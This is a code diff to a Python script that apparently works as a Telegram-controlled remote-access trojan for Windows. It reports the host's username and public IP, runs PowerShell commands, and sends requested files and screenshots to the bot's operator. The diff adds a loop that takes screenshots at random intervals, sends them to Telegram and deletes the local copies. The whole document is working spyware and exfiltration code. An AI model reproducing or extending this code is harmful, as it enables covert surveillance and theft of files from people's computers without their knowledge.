@@ -4,12 +4,18 @@ import requests
 import os
 import subprocess
 import cv2
+import random
+import threading
+import time
 
 alias = "Alias"
 telegram_api_key = "HTTP_TOKEN_TELEGRAM_BOT"
 pastebin_api_key = "TOKEN_PASTEBIN"
 bot = telebot.TeleBot(telegram_api_key)
 print("The bot is running")
+
+# Global variable to control the autoscreenshot thread
+autoscreenshot_running = False
 
 def get_public_ip():
     try:
@@ -45,11 +51,11 @@ def handle_kill_confirmation(message):
             bot.send_message(message.chat.id, "🫡")
             bot.stop_polling()
             subprocess.run(["start", "kill_script.bat"], shell=True)
-            # Terminer le bot ici si vous le souhaitez
         else:
             bot.send_message(message.chat.id, "Failed to create kill script.")
     elif message.text.lower() == "no":
         bot.send_message(message.chat.id, "Thanks you 😮‍💨")
+
 def take_screenshot():
     try:
         screenshot = pyautogui.screenshot()
@@ -139,13 +145,39 @@ def upload_to_pastebin(text):
         print("Error uploading to Pastebin:", e)
         return None
 
+# Function to handle autoscreenshot start
+def autoscreenshot_start():
+    global autoscreenshot_running
+    autoscreenshot_running = True
+
+    while autoscreenshot_running:
+        delay = random.randint(1, 10)  # Random delay between 1 and 10 seconds
+        time.sleep(delay)
+
+        screenshot_path = take_screenshot()
+        if screenshot_path:
+            with open(screenshot_path, 'rb') as photo:
+                bot.send_message(chat_id, "Auto-screenshot taken 📸🫡")
+                bot.send_photo(chat_id, photo)
+            os.remove(screenshot_path)
+
+# Function to stop the autoscreenshot loop
+def autoscreenshot_stop():
+    global autoscreenshot_running
+    autoscreenshot_running = False
+    bot.send_message(chat_id, "Auto-screenshot stopped ✋🫡")
+
+# Function to handle incoming messages
 @bot.message_handler(func=lambda message: True)
 def echo_all(message):
+    global chat_id
+    chat_id = message.chat.id
+    
     if "/sessions password" in message.text:
         public_ip = get_public_ip()
         if public_ip:
             user_username = os.getlogin()
-            bot.send_message(message.chat.id, f" 👤 {user_username} | 🟢 {public_ip} | 🪪 {alias}" )
+            bot.send_message(message.chat.id, f" 👤 {user_username} | 🟢 {public_ip} | 🪪 {alias}")
 
     elif message.text == "/screenshot " + alias:
         screenshot_file = take_screenshot()
@@ -157,10 +189,8 @@ def echo_all(message):
         else:
             bot.send_message(message.chat.id, f"Picture Failed 📸😓")
 
-    elif message.text.startswith("/get "+ alias + " " ):
-        # Retrieve the filename from the message
+    elif message.text.startswith("/get "+ alias + " "):
         filename = message.text[len("/get " + alias +" "):].strip()
-        # Check if the file exists
         if os.path.exists(filename):
             with open(filename, "rb") as file:
                 bot.send_message(message.chat.id, f"Your file 📄🫡")
@@ -173,5 +203,13 @@ def echo_all(message):
 
     elif message.text == "/powershell " + alias:
         execute_powershell_command(message)
+
+    elif message.text == "/autoscreenshot start " + alias:
+        bot.send_message(message.chat.id, "Auto-screenshot started 📸")
+        autoscreenshot_thread = threading.Thread(target=autoscreenshot_start)
+        autoscreenshot_thread.start()
+
+    elif message.text == "/autoscreenshot stop " + alias:
+        autoscreenshot_stop()
 
 bot.infinity_polling()
